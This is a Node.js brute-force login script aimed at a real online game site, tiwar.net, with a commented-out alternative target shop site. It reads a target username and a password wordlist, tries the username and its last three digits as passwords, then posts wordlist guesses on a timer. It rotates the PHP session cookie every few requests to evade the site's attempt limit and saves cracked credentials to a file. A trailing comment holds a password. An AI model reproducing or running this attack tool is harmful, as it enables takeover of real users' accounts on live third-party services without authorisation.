//node request module to make http requests
var request = require('request');

//node fs module to read from or write to file
var fs = require('fs');
var util = require('util');
//converts relative path to full path
var resolve = require('path').resolve

//passwords array which will contain passwords from .txt file
var passwords = [];
var PASS_LENGTH = 0
    //node xml2js module to parse xml response
    //cyberoam (captive portal) sends xml response
var parseString = require('xml2js').parseString;

console.log = function(d) { //
    log_file.write(util.format(d) + '\n');
    // log_stdout.write(util.format(d) + '\n');
};

//username supplied by user as command line argument
var targetUsername = process.argv[2];

//wordlist is taken through the commandline
var wordlistPath = process.argv[3];

//Log to file
var log_file = fs.createWriteStream(__dirname + `/debug-${targetUsername}.log `, { flags: 'w' });
var log_stdout = process.stdout;

//CONSTANTS
const URL = 'http://tiwar.net/?sign_in=1';
let SESSIONID = ''

/*********************************************************************************************************************************/

//raises error if either of the arguments are missing
if (!wordlistPath || !targetUsername) {
    console.log("Usage: node main.js <rollno> <wordlist>");
    // return -1;
}

//checks for the existance of wordlist in the specified location
if (!fs.existsSync(wordlistPath)) {
    console.log("Wordist file doesn't exist here : " + resolve(wordlistPath));
    // return -2
}

var lineReader = require('readline').createInterface({
    input: fs.createReadStream(wordlistPath)
});

lineReader.on('line', function(line) {
    passwords.push(line);
}).on('close', function() {
    console.log("Total data: ", PASS_LENGTH, " lines!");
    PASS_LENGTH = passwords.length;
    // This method will be executed after reading the complete file.
    bruteForce();
});

//global variable to check if password has been guessed
//used to prevent further attack once password has been guessed
var cracked = false;
var stop = false;

//function which will make http post request to login portal
let count = 0;

var makeRequest = async function(testCase) {
    count++;
    if (count % 1000 == 0 && count >= 1000) {
        console.log(`Count ${ count }items...`)
    }
    if (count >= 4) {
        // Generate new SESSION ID
        await request({
            url: 'http://tiwar.net/',
            method: 'get',
        }, (error, response) => {
            if (error) throw new Error(error);
            SESSIONID = response.rawHeaders[13].split(';')[0].split('=')[1]
        })
        count = 0
    }

    let params = {...testCase.params,
        headers: {
            Cookie: `PHPSESSID=${SESSIONID};`
        }
    }

    var options = {
        ...params,
        formData: testCase.body
    };

    request(options, function(error, response) {
        if (error) {
            console.log("Error: ", error);
        }
        // console.log(testCase.body)
        // console.log(response.body)
        if (response.body.includes('attempts limit exceeded')) {
            console.log('-----------------------------------------------------------------------------')
            console.log('BLOCK!')
            console.log('-----------------------------------------------------------------------------')
            stop = true
        }
        if (response.body.includes('My Hero')) {
            console.log('TRUE');
            console.log({ username: testCase.body.login, password: testCase.body.pass });
            writeToFile('cracked.txt', { username: testCase.body.login, password: testCase.body.pass })
            cracked = true
        }
    });
};

//function to write username and corresponding guessed password in cracked.txt file
var writeToFile = function(fileName, data) {
    fs.appendFile(fileName, data.username + ': ' + data.password + '\n', function(err) {
        if (err) {
            console.log(err);
        }
    });
};

//method which will make one request in 100 milli seconds (1 different password per request)
var bruteForce = async function() {
    var index = -1;
    //Auto generate cookie
    await request({
        url: 'http://tiwar.net/',
        method: 'get',
    }, (error, response) => {
        if (error) throw new Error(error);
        SESSIONID = response.rawHeaders[13].split(';')[0].split('=')[1]
    })

    //if username is password itself 
    await makeGuess(targetUsername, targetUsername);
    //make guess each 100ms
    var timer = setInterval(async function() {
        //Check stop
        if (stop) {
            clearInterval(timer);
        }
        //stop attack when we have scanned all passwords from list
        //or when password has been successfully guessed
        if ((index == passwords.length) || (cracked == true)) {
            clearInterval(timer);
            if (cracked == true) {
                console.log('Success! Check cracked');
            }
        } else if (index == -1) {
            //if password is last 3 digits of username
            //will run only one time
            await makeGuess(targetUsername, targetUsername.substr(targetUsername.length - 3));
            index++;
        } else {
            await makeGuess(targetUsername, passwords[index++]);
        }
        if (index % 1000 == 0 && index >= 1000) {
            console.log(`Loop ${ index }/${PASS_LENGTH} items`)
        }
    }, 150);
};

var makeGuess = function(username, password) {
    //test-server url for testing
    //var url = 'http://localhost:4000/login';  
    var testCase = {
        params: {
            url: URL,
            method: 'post',
        },
        body: {
            login: username,
            pass: password,
        }
        // params: {
        // 	'method': 'POST',
        // 	'url': 'https://shopngocrong.online/dang-nhap',
        // 	'headers': {
        // 		'Content-Type': 'application/json'
        // 	},
        // },
        // body: JSON.stringify({"userName":`${username}`,"password":`${password}`})
    };
    makeRequest(testCase);
};



//PASSWORD: 8675309